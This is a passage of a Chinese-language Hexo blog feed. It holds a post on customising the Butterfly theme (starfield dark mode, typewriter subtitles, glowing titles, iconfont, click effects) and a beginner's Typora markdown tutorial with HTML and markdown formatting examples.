y,c[t].<span class="title function_">reset</span>();<span class="title function_">u</span>()&#125;(),<span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>)==<span class="string">&#x27;dark&#x27;</span>&amp;&amp;<span class="title function_">u</span>(),<span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(t)&#125;()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">dark</span>()</span><br></pre></td></tr></table></figure><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><p>在<code>inject</code>-<code>head</code>下追加:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">head:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/universe.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>inject</code>-<code>bottom</code>下追加:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bottom:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;canvas</span> <span class="string">id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>星空效果只有打开黑夜模式后才能看出来</p><p><strong>todo:打开黑夜模式后,加了黄底的字会很难辨认,并且刺眼,把以前加了黄底的字改一改吧</strong></p><br><hr><br><h1 id="11主页显示的副标题"><a href="#11主页显示的副标题" class="headerlink" title="11主页显示的副标题"></a>11主页显示的副标题</h1><p>在主题目录下的<code>_config.yml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the subtitle on homepage (主頁subtitle)</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Typewriter Effect (打字效果)</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># loop (循環打字)</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source 調用第三方服務</span></span><br><span class="line">  <span class="comment"># source: false 關閉調用</span></span><br><span class="line">  <span class="comment"># source: 1  調用一言網的一句話（簡體） https://hitokoto.cn/</span></span><br><span class="line">  <span class="comment"># source: 2  調用一句網（簡體） http://yijuzhan.com/</span></span><br><span class="line">  <span class="comment"># source: 3  調用今日詩詞（簡體） https://www.jinrishici.com/</span></span><br><span class="line">  <span class="comment"># subtitle 會先顯示 source , 再顯示 sub 的內容</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">3</span></span><br><span class="line">  <span class="comment"># 如果關閉打字效果，subtitle 只會顯示 sub 的第一行文字</span></span><br><span class="line">  <span class="attr">sub:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">心态平和</span> <span class="string">热爱生活</span></span><br></pre></td></tr></table></figure><p>在 <code>source</code>中调用了第三方服务后(例如今日诗词),主页副标题会随机展示来自今日诗词的内容</p><p>然后再展示<code>sub</code>后添加的自定义内容(<code>effect</code>需要设置为<code>true</code>才能依次显示多个内容)</p><p>效果:</p><img src="/images/hexo-butterfly/image-20220806141933771.png" alt="image-20220806141933771" style="zoom:67%;" /><p><span style='color:black;background:yellow;font-size:23px;font-family:hei'><strong>踩坑记录:</strong></span></p><p>这里配置完毕之后主页一直不显示设置好的副标题</p><p>最后在butterfly的issue中找到:<a href="https://github.com/jerryc127/hexo-theme-butterfly/issues/824">https://github.com/jerryc127/hexo-theme-butterfly/issues/824</a></p><p>因为我之前在<code>blog</code>的根目录除了<code>_config.yml</code>之外,还有两个名为<code>_config.butterfly.yml</code>和<code>_config.landscape.yml</code>的文件</p><p>(这两个文件是不生效的,这里博客的所有配置都在根目录和主题目录下的两个<code>_config.yml</code>中)</p><p>将这两个文件删除,就可以正确显示副标题了</p><p>🥳再加一点炫酷的东西:  让主标题和副标题闪闪发光!</p><img src="/images/hexo-butterfly/image-20220806142708278.png" alt="image-20220806142708278" style="zoom:67%;" /><p>在<code>themes\source\css</code>下创建文件<code>title.css</code>,内容为:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 网站标题、副标题闪光 */</span></span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-title</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-subtitle</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">30px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">40px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">70px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">80px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">0</span>, <span class="number">222</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-title</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line"><span class="selector-id">#page-header</span> <span class="selector-id">#site-subtitle</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">10px</span>, <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">20px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">30px</span>, <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">40px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">70px</span>, <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">80px</span>,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="number">0px</span> <span class="number">0px</span> <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在主题目录下的<code>_config.yml</code>中的<code>inject---head</code>下添加:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/title.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><br><hr><br><h1 id="12引入图标库iconfont"><a href="#12引入图标库iconfont" class="headerlink" title="12引入图标库iconfont"></a>12引入图标库iconfont</h1><p><span id="02_01">到官方网站注册一个账号<a href="https://www.iconfont.cn/">https://www.iconfont.cn/</a></span></p><p>搜索到某个图标后点击购物车图标将其<strong>添加入库</strong>,第一次添加时需要创建一个新项目</p><img src="/images/hexo-butterfly/image-20220806151547043.png" alt="image-20220806151547043" style="zoom:50%;" /><p>创建好项目之后,会自动跳转到项目的详情页,此时刚刚找到的那个图标已经加入到了项目中,点击<code>Font class</code>,然后点击<code>查看在线链接</code>,第一次会显示<code>暂无代码,点击生成</code>,生成后就会出现下边的这个链接</p><img src="/images/hexo-butterfly/image-20220806151655933.png" alt="image-20220806151655933" style="zoom:67%;" /><p>将这个链接复制到主题目录下的<code>_config.yml</code>中的<code>inject---head</code>下,格式为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- &lt;link rel=&quot;stylesheet&quot; href=&quot;//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css&quot;&gt;</span><br></pre></td></tr></table></figure><p>接下来就可以在需要的地方直接以图标名调用图标了,格式为<code>iconfont 图标名称</code></p><p>例如:</p><img src="/images/hexo-butterfly/image-20220806152035453.png" alt="image-20220806152035453" style="zoom: 67%;" /><p>效果为:</p><img src="/images/hexo-butterfly/image-20220806152059932.png" alt="image-20220806152059932" style="zoom:67%;" /><br><hr><br><h1 id="其他小改动"><a href="#其他小改动" class="headerlink" title="其他小改动"></a>其他小改动</h1><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">highlight_theme:</span> <span class="string">mac</span> <span class="comment">#  darker / pale night / light / ocean / mac / mac light / false</span></span><br></pre></td></tr></table></figure><p>可选项包括:</p><p><code>darker / pale night / light / ocean / mac / mac light / false</code></p><h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">activate_power_mode:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">colorful:</span> <span class="literal">true</span> <span class="comment"># open particle animation (冒光特效)</span></span><br><span class="line">  <span class="attr">shake:</span> <span class="literal">true</span> <span class="comment">#  open shake (抖動特效)</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span></span><br><span class="line"><span class="attr">fireworks:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">9999</span> <span class="comment"># -1 or 9999</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span></span><br><span class="line"><span class="attr">click_heart:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mouse click effects: words (鼠標點擊效果: 文字)</span></span><br><span class="line"><span class="attr">ClickShowText:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">text:</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🤣</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😘</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🤨</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">🥱</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😣</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😤</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">😭</span></span><br><span class="line">  <span class="attr">fontSize:</span> <span class="string">25px</span></span><br><span class="line">  <span class="attr">random:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>可以选择点击后出现 <strong>烟火,爱心,自定义文字等</strong></p><p>这里使用点击后出现文本特效,在<code>text</code>子字段下面添加想要出现的文字,每次点击会随机(<code>random</code>字段为<code>True</code>)出现其中的某一个, 通过<code>fontSize</code>来设置字体大小</p>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora写markdown的慢慢入门😥</title>
      <link href="/post/39e7fa88.html"/>
      <url>/post/39e7fa88.html</url>
      
        <content type="html"><![CDATA[<p><span id="jump">这是一个锚点,是后面页内链接要跳转到的地方,这里的id可以自定义,用来和后面的链接对应</span></p><h1 id="1这是代码"><a href="#1这是代码" class="headerlink" title="1这是代码"></a>1这是代码</h1><p>直接连敲三下&#96;(在键盘的tab上方)就可以打开下面这样的代码环境</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> snowflake_proxy</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">    <span class="string">&quot;git.torproject.org/pluggable-transports/snowflake.git/v2/common/event&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/ice/v2&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/sdp/v3&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/pion/webrtc/v3&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> remoteIPPatterns = []*regexp.Regexp&#123;</span><br><span class="line">    <span class="comment">/* IPv4 */</span></span><br><span class="line">    regexp.MustCompile(<span class="string">`(?m)^c=IN IP4 ([\d.]+)(?:(?:\/\d+)?\/\d+)?(:? |\r?\n)`</span>),</span><br><span class="line">    <span class="comment">/* IPv6 */</span></span><br><span class="line">    regexp.MustCompile(<span class="string">`(?m)^c=IN IP6 ([0-9A-Fa-f:.]+)(?:\/\d+)?(:? |\r?\n)`</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><br><h1 id="2-自定义文字的表现效果"><a href="#2-自定义文字的表现效果" class="headerlink" title="2 自定义文字的表现效果"></a>2 自定义文字的表现效果</h1><h2 id="2-1-通过HTML元素"><a href="#2-1-通过HTML元素" class="headerlink" title="2.1 通过HTML元素"></a>2.1 通过HTML元素</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;color:blue;background:yellow;font-size:18px;font-family:hei&#x27;</span>&gt;</span>测试字体<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style='color:blue;background:yellow;font-size:18px;font-family:hei'>测试字体</span></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;color:blue;font-size:18px;font-family:hei&#x27;</span>&gt;</span></span><br><span class="line">    我是一个独立的块,上面的align=&#x27;center&#x27;可以设置这个块里的文字居中  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div align='center' style='color:blue;font-size:18px;font-family:hei'>    我是一个独立的块,上面的align='center'可以设置这个块里的文字居中  </div><br><h2 id="2-2-文字加粗"><a href="#2-2-文字加粗" class="headerlink" title="2.2 文字加粗"></a>2.2 文字加粗</h2><p><strong>文字加粗效果(在两边各加两个星号)</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**文字加粗效果**</span><br></pre></td></tr></table></figure><p>或者:</p><p>在<code>span</code>内通过:(尽量多用这种,因为markdown语法在转换成html时可能会出问题)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;font-weight:bold&quot;</span>&gt;</span>被加粗的文字<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="2-3-分割线"><a href="#2-3-分割线" class="headerlink" title="2.3 分割线"></a>2.3 分割线</h2><p>(输入三个星号自动变成分割线):</p><hr><br><h2 id="2-4-删除文字"><a href="#2-4-删除文字" class="headerlink" title="2.4 删除文字"></a>2.4 删除文字</h2><p>在文字两边各加两个~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~我被删除了!~~</span><br></pre></td></tr></table></figure><p><del>我被删除了!</del></p><br><h2 id="2-5-下划线"><a href="#2-5-下划线" class="headerlink" title="2.5 下划线"></a>2.5 下划线</h2><p>通过u标签包裹实现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>我带下划线<span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br></pre></td></tr></table></figure><p><u>我带下划线</u></p><br><h2 id="2-6-脚注"><a href="#2-6-脚注" class="headerlink" title="2.6 脚注"></a>2.6 脚注</h2><p>对我的补充说明,鼠标悬停在后面就会显示这些补充信息 <a href="%E8%A6%81%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF%E5%86%99%E5%9C%A8%E8%BF%99%E9%87%8C">^脚注显示的文字</a>。</p><br><hr><br><h1 id="3-列表"><a href="#3-列表" class="headerlink" title="3 列表"></a>3 列表</h1><h2 id="3-1-无序列表"><a href="#3-1-无序列表" class="headerlink" title="3.1 无序列表"></a>3.1 无序列表</h2><ul><li>在一行的开头按下 减号”-“ 然后按空格就可以产生列表了</li><li>回车自动生成下一项<ul><li>回车后tab生成二级列表</li></ul></li></ul><br><h2 id="3-2-有序列表"><a href="#3-2-有序列表" class="headerlink" title="3.2 有序列表"></a>3.2 有序列表</h2><ol><li>输入”1.”然后按空格,自动生成有序列表</li><li>输入回车会自动往下排<ol><li>回车后tab生成二级列表</li></ol></li></ol><br><h2 id="3-3-任务列表"><a href="#3-3-任务列表" class="headerlink" title="3.3 任务列表"></a>3.3 任务列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先输入后面的文字</span><br><span class="line">在前面输入&quot;-&quot;和&quot;[]&quot;</span><br><span class="line">在两者之间加上空格</span><br><span class="line">然后在[]中输入x</span><br><span class="line">最后在[]和文字之间加上空格</span><br><span class="line"></span><br><span class="line">- [x] 任务1</span><br></pre></td></tr></table></figure><ul><li><p><input checked="" disabled="" type="checkbox"> 今天学会搭建博客</p></li><li><p><input checked="" disabled="" type="checkbox"> hhh</p></li></ul><br><hr><br><h1 id="4-区块"><a href="#4-区块" class="headerlink" title="4 区块"></a>4 区块</h1><blockquote><p>输入”&gt;” 然后按空格,自动产生一个区块</p><p>区块是可以嵌套的:</p><blockquote><p>再次输入”&gt;” 然后按空格</p><p>我是第二层区块</p><ul><li><p>在区块里面同样可以使用列表,我是插入在区块里的列表</p></li><li><p>同理,在列表里也可以使用区块:</p></li><li><blockquote><p>我是列表里的区块</p><p>哈哈哈哈哈</p></blockquote></li></ul></blockquote></blockquote><br><hr><br><h1 id="5-链接"><a href="#5-链接" class="headerlink" title="5 链接"></a>5 链接</h1><h2 id="5-1-链接到网址"><a href="#5-1-链接到网址" class="headerlink" title="5.1 链接到网址"></a>5.1 链接到网址</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">链接名称</span>](<span class="link">链接地址 &quot;可选项,悬停时显示的文字&quot;</span>)</span><br></pre></td></tr></table></figure><p>例如: </p><p>在编辑器里ctrl点击链接以打开链接</p><p><a href="https://www.runoob.com/markdown/md-link.html" title="我是悬停文字">我可以链接到菜鸟教程的链接页面</a></p><p>也可以直接显示链接地址:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">链接地址</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例如:<a href="https://www.runoob.com/">https://www.runoob.com</a></p><br><h2 id="5-2-链接到同目录文件"><a href="#5-2-链接到同目录文件" class="headerlink" title="5.2 链接到同目录文件"></a>5.2 链接到同目录文件</h2><p>链接到同目录其他md文件:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">我可以链接到同目录下的hello_world.md</span>](<span class="link">hello-world.md</span>)</span><br></pre></td></tr></table></figure><p><a href="hello-world.md">我可以链接到同目录下的hello_world.md</a></p><br><h2 id="5-3-页面内跳转"><a href="#5-3-页面内跳转" class="headerlink" title="5.3 页面内跳转"></a>5.3 页面内跳转</h2><br><h3 id="5-3-1-跳转到锚点"><a href="#5-3-1-跳转到锚点" class="headerlink" title="5.3.1 跳转到锚点"></a>5.3.1 跳转到锚点</h3><p><a href="#jump">由此跳转到</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在某处定义锚点: <span class="language-xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;自定义&quot;</span>&gt;</span></span>这是一个锚点,是后面页内链接要跳转到的地方,这里的id可以自定义,用来和后面的链接对应<span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">用来跳转到锚点的链接 [<span class="string">由此跳转到</span>](<span class="link">#自定义</span>)</span><br></pre></td></tr></table></figure><br><h3 id="5-3-2-跳转到标题"><a href="#5-3-2-跳转到标题" class="headerlink" title="5.3.2 跳转到标题"></a>5.3.2 跳转到标题</h3><p><a href="#1%E8%BF%99%E6%98%AF%E4%BB%A3%E7%A0%81">由此跳转到</a></p><p>踩坑记录: 像这样使用链接时,<strong>被跳转的标题中不能有空格!!!!!</strong></p><p>例如如果链接是这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[由此跳转到](#1 这是代码)</span><br></pre></td></tr></table></figure><p>那么在生成HTML后无法将其转化为链接</p><br><p>正确的形式:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">由此跳转到</span>](<span class="link">#1这是代码</span>)</span><br></pre></td></tr></table></figure><p>不过这样也太容易出问题了,以后还是得采用多采用跳转到锚点的方式</p><hr><p><br><br></p><h1 id="6-图片"><a href="#6-图片" class="headerlink" title="6 图片"></a><strong>6 图片</strong></h1><p>直接插入图片:</p><p>(由于在typora中配置了插入图片时图片的存储规则,将图片复制进来时,图片会自动存储到source&#x2F;images&#x2F;与此md文件同名的文件夹)</p><p><img src="/images/markdownlearn/image-20220722114856557.png" alt="image-20220722114856557"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">image-20220722095454051</span>](<span class="link">/images/markdownlearn/image-20220722095454051.png</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/markdownlearn/image-20220722095454051.png" alt="image-20220722095454051"></p><p><span id="s1">使用html来加载图片</span></p><p>好处是可以调整图片大小,加图片标题等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;/images/markdownlearn/image-20220722095454051.png&#x27;</span> <span class="attr">width</span>=<span class="string">600px</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;font-size:15px;font-family:kaiti;color:black&#x27;</span>&gt;</span>图片标题 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div align='center'>  <img src='/images/markdownlearn/image-20220722095454051.png' width=600px>  <p align='center' style='font-size:15px;font-family:kaiti;color:black'>图片标题 </p></div><br><p><strong>关于typora编辑器和部署后浏览器中图片无法同时正确显示的问题</strong>:</p><p>部署后,默认的根目录是public目录</p><p>此时图片的存储路径规则是 &#x2F;images&#x2F;markdown文件名&#x2F;图片名 , 所以如果在编辑器中以这种路径模式描述图片,图片就能够在浏览器中正确显示</p><p>而在生成public之前,一个md文件中的图片默认是存储在 <code>../../source/images/markdown文件名</code>这个目录下的</p><p>此时去下图位置将source设置成图片根目录,就能够保持编辑器和浏览器中图片路径一致,而且还能正确显示了</p><img src="/images/markdownlearn/image-20220722163205824.png" alt="image-20220722163205824" style="zoom: 67%;" /><br><br><hr><br><h1 id="7-表格"><a href="#7-表格" class="headerlink" title="7 表格"></a><strong>7 表格</strong></h1><p>直接插入表格即可(竟然也不支持合并单元格)</p><p>有合并单元格的需求的话,还得使用html的表格:</p><p>例如:</p><p>表格用整体table包裹</p><p>每一行用<strong>tr</strong>包裹(row)</p><p>表头中的文字用<strong>th</strong>包裹</p><p>具体单元格中的文字用<strong>td</strong>包裹</p><p>合并列用 colspan&#x3D;”合并的列数”</p><p>合并行用 rowspan&#x3D;”合并的行数”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span 